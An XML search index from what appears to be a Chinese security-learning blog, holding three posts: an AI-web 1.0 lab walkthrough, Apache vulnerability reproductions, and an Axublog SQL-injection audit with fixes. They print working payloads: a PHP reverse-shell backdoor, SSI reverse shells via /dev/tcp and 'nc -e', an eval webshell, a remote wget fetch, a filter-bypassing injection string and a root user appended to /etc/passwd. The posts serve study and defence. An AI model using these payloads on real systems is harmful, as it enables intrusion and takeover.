<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AI-web1.0靶机学习</title>
    <url>/2020/03/12/ai-web1-0-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
<pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
<pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
<pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
<pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
<p>继续对目标数据库中的表进行探测</p>
<pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
<p>探测字段</p>
<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
<pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
<p>依次选择4:php web server</p>
<p>​                2:custom location</p>
<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
<p>我们在shell下载下a.php文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
<p>我们在kali下监听 9966端口。</p>
<pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
<p>我们可以发现kali已经成功反弹shell。</p>
<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
<pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p>
<pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
<p><strong>完</strong></p>
]]></content>
      <categories>
        <category>靶机学习</category>
      </categories>
      <tags>
        <tag>AI-web 1.0</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache中间件漏洞学习</title>
    <url>/2020/04/02/apachhe-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h3 id="Apache中间件漏洞复现"><a href="#Apache中间件漏洞复现" class="headerlink" title="Apache中间件漏洞复现"></a>Apache中间件漏洞复现</h3><h4 id="关于apache"><a href="#关于apache" class="headerlink" title="关于apache"></a>关于apache</h4><h5 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h5><p>​       Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将Perl/Python等解释器编译到服务器中。</p>
<h5 id="Apache的目录结构："><a href="#Apache的目录结构：" class="headerlink" title="Apache的目录结构："></a>Apache的目录结构：</h5><ul>
<li>bin——-存放常用的命令工具，例如httpd</li>
<li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li>
<li>conf——Linux的配置相关文件，例如httpd.conf</li>
<li>error—–错误记录</li>
<li>htdocs—-放网站源码</li>
<li>icons—–网站图标</li>
<li>logs——日志</li>
<li>modules—扩展模块</li>
<li>manual—-手册</li>
</ul>
<h5 id="apache原理介绍"><a href="#apache原理介绍" class="headerlink" title="apache原理介绍:"></a>apache原理介绍:</h5><p>要讲到的Apahce的漏洞必须要理解Apache的运行原理。</p>
<p><img src="v2-61e13c6df766e990c4e228d3222fee36_720w.jpg" alt=""></p>
<p>图中简易描述了Apahce与PHP配合完成了一次WEB请求，Apahce在前，PHP在后，那两者之间如何进行通信的呢？先了解下PHP的架构。如下图</p>
<p><img src="v2-7692da2f8367d3fff6ef09df67fba07a_720w.jpg" alt=""></p>
<ul>
<li>Zend Engine是PHP的底层实现，包含编译和执行，底层由C语言实现。</li>
<li>Zend API、Zend Extension API是基于Zend底层对外封装提供服务。</li>
<li>Extendions使用Extension API实现了扩展库、标准库，例如各种内置函数、MySQL连接库等</li>
<li>SAPI是重点，全称是Server Application Programming Interface，也就是服务端应用编程接口。PHP就是通过它来和Apache、Nginx、FastCGI交互</li>
<li>Application是最上层，也就是我们写的PHP代码了</li>
</ul>
<p>Apache本身是不支持PHP解析的,通过架构图我们可以知道是通过SAPI进行通信，那Apache如何和SAPI通信呢？Apache怎么知道什么类型的文件要解析为PHP？如果你手动搭建过Apache解析PHP的环境，就肯定了解这两个步骤：</p>
<pre><code># 加载php5_module模块
LoadModule php5_module php5apache2_2.dll的路径
# 添加可以执行php的文件类型，让.php文件类型解析为PHP
AddType application/x-httpd-php .php
# 或者将AddType变为下面的(在Apache 2.4.0~2.4.29中默认使用了该方式)
&lt;FilesMatch \.php$&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
以及
&lt;IfModule dir_module&gt;
DirectoryIndex index.html index.htm index.php index.phtml
&lt;/IfModule&gt;</code></pre><p>​    Apache通过LoadModule来加载php5_module模块（php5apache2_2.dll），这样做的目的是让Apache加载php5_module模块来解析PHP文件。意思其实就是用LoadModule来加载php5_module。也就是把php作为Apache的一个子模块来运行。当通过Web访问php文件时，Apache就会调用php5_module来解析php代码。<br>调用过程可以概括为</p>
<pre><code>HTTP-&gt;Apahce-&gt;php5_module-&gt;sapi-&gt;php。</code></pre><h4 id="Apache-文件解析漏洞"><a href="#Apache-文件解析漏洞" class="headerlink" title="Apache 文件解析漏洞"></a>Apache 文件解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户的配置问题。Apache文件解析漏洞涉及到一个解析文件的特性。Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别，则继续向左识别，发现后缀是php,交给php处理这个文件。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先打开phpstudy，切换apache版本为5.2.17.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201102616.png" alt=""></p>
<p>我们在本地网站根目录下新建文本文档写入任意字母。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104725.png" alt=""></p>
<p>我们尝试修改后缀名为不存在的.456，然后在本地访问该文件</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104035.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104057.png" alt=""></p>
<p>发现仍然可以成功读取</p>
<p>我们继续修改后缀名</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104123.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104141.png" alt=""></p>
<p>发现服务器仍然可以解析</p>
<p>我们修改为.php.360尝试，依然可以成功解析。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104210.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201104231.png" alt=""></p>
<p>那么我们在文件上传时就可以利用Apache的解析特性进行绕过</p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为<em>.php.\</em>的访问权限：</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4|php5.)"</span><span class="token punctuation">></span></span></span>
Order Deny<span class="token punctuation">,</span>Allow
Deny from all
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span></span></code></pre>
<h4 id="Apache-目录遍历漏洞"><a href="#Apache-目录遍历漏洞" class="headerlink" title="Apache 目录遍历漏洞"></a>Apache 目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p> 目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们打开phpstudy.</p>
<p>然后在本地网站根目录下新建多个子目录</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201112807.png" alt=""></p>
<p>我们此时访问网站</p>
<p><img src="18d8bc3eb13533fa38aa502b974b3d1a41345b31.jpg" alt=""></p>
<p>可以看到很明显的index  of标志,说明此时存在目录遍历</p>
<p>我们可以在谷歌中通过 intitle ：index of来帮我们寻找目录遍历漏洞</p>
<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成</p>
<p>Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200201114345.png" alt=""></p>
<h4 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715</a></p>
<p><strong>（我按该文章复现的以下两个漏洞，人懒就直接复制了。。。。）</strong></p>
<p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p>
<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
<p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p>
<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715">Vulhub</a>，环境文件有3个</p>
<ul>
<li>Dockerfile(apache环境)</li>
<li>docker-compose.yml（compose文件，在此环境中意义不大）</li>
<li>index.php（源文件缺少前台源码，已补全）</li>
</ul>
<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
<pre class=" language-bash"><code class="language-bash">docker-compose build
docker-compose up -d</code></pre>
<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h5 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>​        接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为/etc/apache2/conf-available/docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/index.php">http://IP:8080/index.php</a>可以看到</p>
<p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.jpg" alt="img"></p>
<p>点击submit进行上传，burp可以抓到</p>
<p><img src="https://pic1.zhimg.com/80/v2-c3df365945893aa605e58927c377e110_720w.jpg" alt="img"></p>
<p>上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容：</p>
<p><img src="https://pic2.zhimg.com/80/v2-844c604155e2bbdbfcdb51501261eb8d_720w.jpg" alt="img"></p>
<p>改完后将数据包给服务器，此时在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//IP%3A8080/phpinfo.php%0a">http://IP:8080/phpinfo.php%0a</a>便可以看到phpinfo的界面，说明利用成功。</p>
<p><strong>在Windows下的表现</strong><br>将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题：</p>
<p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.png" alt="img"></p>
<p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p>
<p><strong>index.php源码</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
<h4 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h4><p>转载：<a href="https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce</a></p>
<p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p>
<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
<p><strong>环境说明</strong>：PHP7.1 、 Apache2.4.25</p>
<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce">Vulhub</a>，环境文件有2个</p>
<ul>
<li>docker-compose.yml</li>
<li>upload.php</li>
</ul>
<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p>
<pre class=" language-text"><code class="language-text">docker-compose build
docker-compose up -d</code></pre>
<p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="whoami" --></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span></code></pre>
<p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p>
<p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.jpg" alt="img"></p>
<p>上传webshell：</p>
<pre class=" language-text"><code class="language-text"><!--#exec cmd="wget http://xxx/shell.txt | rename shell.txt shell.php" -->
echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre>
<p>反弹shell：</p>
<pre class=" language-text"><code class="language-text"><!--#exec cmd="/bin/bash -i > /dev/tcp/192.168.0.118/8888 0<&1 2>&1" -->
<!--#exec cmd="nc x.x.x.x 8888 -e /bin/bash"--></code></pre>
<h5 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/1.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/1.png" alt="img"></a></p>
<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
<p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/2.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/2.png" alt="img"></a></p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://zhuanlan.zhihu.com/p/125115734" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/125115734</a></p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>apache中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>Axublog代码审计学习</title>
    <url>/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p>
<pre><code>&lt;?php
header(&quot;Content-type:text/html; charset=utf-8&quot;);
require(&quot;cmsconfig.php&quot;);
require(&quot;class/c_other.php&quot;);
sqlguolv();

$g=$_GET[&#39;g&#39;];


if ($g==&#39;arthit&#39;){
$id=$_GET[&#39;id&#39;];        
    if($id!=&#39;&#39;){

$tab=$tabhead.&quot;arts&quot;;
mysql_select_db($tab);
$sql=mysql_query(&quot;UPDATE &quot;.$tab.&quot; SET hit=hit+1 where id=&quot;.$id);  //直接将$_GET[&#39;id&#39;]提取的                                                                      id带入sql查询，没有经过                                                                      有效过滤
$sql = mysql_query(&quot;select * from &quot;.$tab.&quot; where id=&quot;.$id);
$row=mysql_fetch_array($sql);
    $str=$row[&#39;hit&#39;];
    echo &#39;document.write(&#39;.$str.&#39;);&#39;;
    }
}
</code></pre><p>我们尝试直接传入payload尝试：</p>
<pre><code>/hit/php?g=archit&amp;id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12</code></pre><p>发现被拦截。</p>
<p>我们发现在get传参之前，有一个过滤函数。</p>
<pre><code>if(sqlguolv()==1){die(&#39;禁止输入特殊符号和非法访问！&#39;);}</code></pre><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p>
<pre><code>Function sqlguolv() {
@header(&quot;Content-type:text/html; charset=utf-8&quot;);
$a=&#39;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&#39;|\\*|\*|union|into/i&#39;;
if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 ){return &quot;1&quot;;}
}</code></pre><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p>
<p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p>
<p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p>
<p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p>
<pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p>
<pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p>
<pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p>
